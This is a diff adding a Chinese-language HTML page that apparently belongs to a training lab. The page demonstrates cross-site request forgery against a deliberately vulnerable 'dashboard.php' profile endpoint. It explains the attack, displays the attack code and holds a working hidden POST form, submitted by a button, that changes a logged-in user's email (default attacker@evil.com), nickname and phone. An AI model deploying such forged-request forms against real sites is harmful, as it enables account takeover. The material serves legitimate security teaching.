@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF攻击演示页面</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .attack-container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            width: 100%;
+            max-width: 650px;
+        }
+        .nav-bar {
+            background: #fff;
+            padding: 12px 20px;
+            border-bottom: 1px solid #f0f0f0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .nav-bar .title {
+            color: #f5576c;
+            font-weight: 600;
+            font-size: 0.95em;
+        }
+        .nav-bar a {
+            color: #666;
+            text-decoration: none;
+            padding: 6px 14px;
+            border-radius: 6px;
+            transition: all 0.3s;
+            font-size: 0.9em;
+        }
+        .nav-bar a:hover {
+            background: #f5576c;
+            color: white;
+        }
+        .attack-header {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 35px 25px;
+            text-align: center;
+        }
+        .attack-header .icon {
+            font-size: 3.5em;
+            margin-bottom: 12px;
+        }
+        .attack-header h1 {
+            font-size: 1.6em;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        .attack-header p {
+            opacity: 0.95;
+            font-size: 1em;
+        }
+        .attack-body {
+            padding: 25px;
+        }
+        .warning-box {
+            background: #fff5f5;
+            border: 1px solid #feb2b2;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 18px;
+            color: #c53030;
+        }
+        .warning-box h3 {
+            font-size: 1em;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .warning-box ul {
+            margin-left: 20px;
+            font-size: 0.9em;
+            line-height: 1.6;
+        }
+        .warning-box li {
+            margin: 5px 0;
+        }
+        .param-editor {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 18px;
+        }
+        .param-editor h4 {
+            color: #333;
+            margin-bottom: 12px;
+            font-size: 0.95em;
+            font-weight: 600;
+        }
+        .param-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 12px;
+        }
+        .param-group label {
+            display: block;
+            color: #666;
+            font-size: 0.85em;
+            margin-bottom: 5px;
+        }
+        .param-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 0.9em;
+            transition: border-color 0.3s;
+        }
+        .param-group input:focus {
+            outline: none;
+            border-color: #f5576c;
+        }
+        .code-section {
+            background: #1e1e1e;
+            border-radius: 8px;
+            margin-bottom: 18px;
+            overflow: hidden;
+        }
+        .code-header {
+            background: #2d2d2d;
+            padding: 12px 15px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .code-header h3 {
+            font-size: 0.9em;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .code-header .btn-toggle {
+            background: #f5576c;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.85em;
+            transition: background 0.3s;
+        }
+        .code-header .btn-toggle:hover {
+            background: #f093fb;
+        }
+        .code-body {
+            padding: 15px;
+            display: none;
+        }
+        .code-body.show {
+            display: block;
+        }
+        .code-body textarea {
+            width: 100%;
+            background: #1e1e1e;
+            color: #f8f8f2;
+            border: none;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            line-height: 1.5;
+            resize: vertical;
+            min-height: 180px;
+            padding: 0;
+        }
+        .code-body textarea:focus {
+            outline: none;
+        }
+        .info-box {
+            background: #e8f4f8;
+            border: 1px solid #bee3f8;
+            border-radius: 8px;
+            padding: 12px 15px;
+            color: #2c5282;
+            margin-bottom: 18px;
+            font-size: 0.9em;
+        }
+        .info-box h4 {
+            margin-bottom: 8px;
+            font-size: 0.95em;
+        }
+        .info-box p {
+            margin: 4px 0;
+        }
+        .info-box code {
+            background: rgba(255,255,255,0.5);
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+        .btn-attack {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-attack:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(245,87,108,0.4);
+        }
+        .btn-attack:active {
+            transform: translateY(0);
+        }
+        .hidden-form {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="attack-container">
+        <div class="nav-bar">
+            <span class="title">🎯 CSRF攻击演示</span>
+            <a href="../index.php">🏠 返回主页</a>
+        </div>
+        
+        <div class="attack-header">
+            <div class="icon">⚠️</div>
+            <h1>CSRF攻击演示页面</h1>
+            <p>这是一个模拟的攻击页面，用于演示CSRF攻击原理</p>
+        </div>
+        
+        <div class="attack-body">
+            <div class="warning-box">
+                <h3>⚠️ CSRF攻击原理</h3>
+                <p>当您点击"发起攻击"按钮时，实际上会执行以下操作：</p>
+                <ul>
+                    <li>向目标网站发送隐藏的表单请求</li>
+                    <li>修改您的个人信息（邮箱、昵称、电话）</li>
+                    <li>由于您已登录目标网站，请求会携带您的登录凭证</li>
+                    <li>目标网站没有CSRF Token验证，攻击可以成功</li>
+                </ul>
+            </div>
+            
+            <div class="param-editor">
+                <h4>🔧 攻击参数配置（可自由修改）</h4>
+                <div class="param-row">
+                    <div class="param-group">
+                        <label>邮箱</label>
+                        <input type="email" id="email" value="attacker@evil.com">
+                    </div>
+                    <div class="param-group">
+                        <label>昵称</label>
+                        <input type="text" id="nickname" value="被攻击的用户">
+                    </div>
+                    <div class="param-group">
+                        <label>电话</label>
+                        <input type="text" id="phone" value="13800138000">
+                    </div>
+                </div>
+            </div>
+            
+            <div class="code-section">
+                <div class="code-header">
+                    <h3>💻 核心攻击代码</h3>
+                    <button class="btn-toggle" onclick="toggleCode()">显示/隐藏</button>
+                </div>
+                <div class="code-body" id="codeBody">
+                    <textarea id="attackCode" readonly></textarea>
+                </div>
+            </div>
+            
+            <div class="info-box">
+                <h4>🎯 攻击目标</h4>
+                <p>目标：<code>dashboard.php</code> 的个人信息修改接口</p>
+                <p>邮箱：<code id="displayEmail">attacker@evil.com</code></p>
+                <p>昵称：<code id="displayNickname">被攻击的用户</code></p>
+                <p>电话：<code id="displayPhone">13800138000</code></p>
+            </div>
+            
+            <form id="attackForm" class="hidden-form" method="POST" action="dashboard.php">
+                <input type="hidden" name="action" value="update_vulnerable">
+                <input type="hidden" name="email" id="form_email" value="attacker@evil.com">
+                <input type="hidden" name="nickname" id="form_nickname" value="被攻击的用户">
+                <input type="hidden" name="phone" id="form_phone" value="13800138000">
+            </form>
+            
+            <button type="button" class="btn-attack" onclick="submitAttack()">⚠️ 发起攻击</button>
+        </div>
+    </div>
+    
+    <script>
+        // 初始化代码
+        function initCode() {
+            updateCode();
+        }
+        
+        // 显示/隐藏代码
+        function toggleCode() {
+            const codeBody = document.getElementById('codeBody');
+            codeBody.classList.toggle('show');
+        }
+        
+        // 更新代码显示
+        function updateCode() {
+            const email = document.getElementById('email').value;
+            const nickname = document.getElementById('nickname').value;
+            const phone = document.getElementById('phone').value;
+            
+            const code = `<!-- 隐藏的攻击表单 -->
+<form id="attackForm" style="display:none" method="POST" action="dashboard.php">
+    <!-- 关键：没有CSRF Token，攻击可以成功 -->
+    <input type="hidden" name="action" value="update_vulnerable">
+    <input type="hidden" name="email" value="${email}">
+    <input type="hidden" name="nickname" value="${nickname}">
+    <input type="hidden" name="phone" value="${phone}">
+</form>
+
+<script>
+// 自动提交表单
+function submitAttack() {
+    document.getElementById('attackForm').submit();
+}
+<\/script>`;
+            
+            document.getElementById('attackCode').value = code;
+        }
+        
+        // 实时更新攻击参数
+        document.getElementById('email').addEventListener('input', function() {
+            document.getElementById('form_email').value = this.value;
+            document.getElementById('displayEmail').textContent = this.value;
+            updateCode();
+        });
+        
+        document.getElementById('nickname').addEventListener('input', function() {
+            document.getElementById('form_nickname').value = this.value;
+            document.getElementById('displayNickname').textContent = this.value;
+            updateCode();
+        });
+        
+        document.getElementById('phone').addEventListener('input', function() {
+            document.getElementById('form_phone').value = this.value;
+            document.getElementById('displayPhone').textContent = this.value;
+            updateCode();
+        });
+        
+        // 提交攻击
+        function submitAttack() {
+            document.getElementById('form_email').value = document.getElementById('email').value;
+            document.getElementById('form_nickname').value = document.getElementById('nickname').value;
+            document.getElementById('form_phone').value = document.getElementById('phone').value;
+            document.getElementById('attackForm').submit();
+        }
+        
+        // 页面加载初始化
+        window.onload = initCode;
+    </script>
+</body>
+</html>
